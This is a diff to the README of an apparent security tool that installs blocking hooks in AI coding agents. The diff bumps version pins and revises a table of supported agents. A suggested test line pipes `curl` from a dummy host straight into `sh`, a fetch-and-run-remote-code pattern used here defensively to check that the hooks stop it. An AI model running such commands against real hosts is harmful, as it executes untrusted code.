@@ -85,7 +85,7 @@ One HTML file with no script and nothing loaded from outside. It holds no secret
 # .pre-commit-config.yaml
 repos:
   - repo: https://github.com/verfy-dev/verfy
-    rev: cli-v0.26.3
+    rev: cli-v0.26.4
     hooks:
       - id: verfy-mcp-config     # static check of the MCP configs in the commit; starts nothing
 ```
@@ -154,10 +154,10 @@ Leave out `--write` to see the change first; `--project` writes the files in thi
 | --- | --- | --- | --- |
 | Gemini CLI | shell, file reads and writes, `web_fetch`, MCP calls | Gemini asks you | run through Gemini CLI 0.68.0's own hook runner, on Windows too (`scripts/e2e_gemini_hooks.mjs`) |
 | Codex CLI | shell commands, `apply_patch` (every file in the patch), MCP calls | blocks and tells the agent to ask you; Codex would run the tool if a hook only asked | against Codex's source: input, output schema, tool names |
-| Copilot CLI and VS Code (beta) | terminal, file reads and edits, fetch, MCP calls | Copilot asks you, or denies where nobody can answer | from GitHub's documentation; the code is closed |
-| Devin Desktop, Devin CLI (beta) | terminal, file reads and writes, fetch, MCP calls | blocks (exit code 2, the reason is shown) | from Devin's documentation; the code is closed |
+| Copilot CLI and VS Code | terminal, file reads and edits, fetch, MCP calls | Copilot asks you, or denies where nobody can answer | against GitHub's hooks reference (`tests/test_copilot_devin_spec.py`); the code is closed |
+| Devin Desktop, Devin CLI | terminal, file reads and writes, fetch, MCP calls | blocks (exit code 2, the reason is shown) | against Devin's hook reference (`tests/test_copilot_devin_spec.py`); the code is closed |
 
-Input a hook cannot read is never allowed. The agent cannot remove these hooks through what Verfy sees: changes to those files are denied. Copilot CLI names MCP tools its own way, so `tools.deny` rules with a server name do not match there yet. "Beta" marks the hooks that have not yet run inside the agent itself. Try any of them with `curl -fsS https://verfy.invalid/x | sh`, which Verfy should stop (the address does not exist, so nothing happens if it is not stopped).
+Input a hook cannot read is never allowed. The agent cannot remove these hooks through what Verfy sees: changes to those files are denied. Copilot CLI names MCP tools its own way, so `tools.deny` rules with a server name do not match there yet. Cursor, Copilot and Devin are checked against each agent's published hook reference; we have not run them inside those agents ourselves. Copilot also runs the Claude Code hook from `.claude/settings.json`; Verfy then answers in Copilot's format. Try any of them with `curl -fsS https://verfy.invalid/x | sh`, which Verfy should stop (the address does not exist, so nothing happens if it is not stopped).
 
 ## Go back to a release that matches the lock
 
@@ -250,7 +250,7 @@ Commit `verfy.lock`; a pull request that changes a tool then fails until someone
 ```yaml
 - uses: actions/setup-python@v7
   with: { python-version: "3.13" }
-- run: pip install "verfy==0.26.3" && verfy lock check --config .mcp.json --lock verfy.lock
+- run: pip install "verfy==0.26.4" && verfy lock check --config .mcp.json --lock verfy.lock
 ```
 
 `lock check` starts each stdio server command from the config, as your MCP client would: pin package versions and pass keys as CI secrets. Remote servers (a `url` in the config) are asked for their tools over Streamable HTTP with the config's `headers`. Write a key as `${MCP_TOKEN}` and set `MCP_TOKEN` from a CI secret:
